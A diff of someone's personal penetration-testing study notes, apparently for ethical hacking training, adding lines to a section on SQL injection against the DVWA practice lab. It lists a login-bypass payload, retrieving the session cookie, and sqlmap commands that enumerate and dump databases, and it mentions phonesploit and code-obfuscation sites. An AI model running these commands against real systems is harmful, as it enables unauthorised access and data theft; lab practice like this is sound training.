@@ -1395,10 +1395,12 @@ or try by id:
 *Once logged look for a pages with a parameters like http://www.moviescope.com/viewprofile.aspx?id=6 (nothing so 5 users)
 
 on DVWA:
+
 Go to SQL Injection and enter = ' or 1=1#
 or: if user & pass given
 F12 - Console - document.cookie
 sqlmap -u http://xxxx/sql/?idxxxxxx=Submit--cookie "security=low; PHPSESSIONID=121121212" --dbs
+
 or: use Burpsuite
 Intercept ON - browse DVWA http://xxxx/sql/?idxxx - see result GET 
 copy request on the bottom = right-click = copy to file  - save to sql.txt
@@ -1406,6 +1408,7 @@ copy request on the bottom = right-click = copy to file  - save to sql.txt
 sqlmap -r sql.txt --dbs
 sqlmap Y upper case say yes N upper
 sqlmap -r sql.txt --dbs --batch (don't have to put Y or N)
+sqlmap -r sql.txt -D dvwa --dump
 -----------------------------------------------------------------------------------------------------------
 
 Android ADB & phonesploit: will be installed in the root folder, if you don't find use the command like "find phonesploit".
@@ -1717,6 +1720,7 @@ http://snarkles.net/scripts/sneak/sneak.php
 http://utf-8.jp/public/jjencode.html
 
 http://ddecode.com/phpdecoder/
+
 
 
 
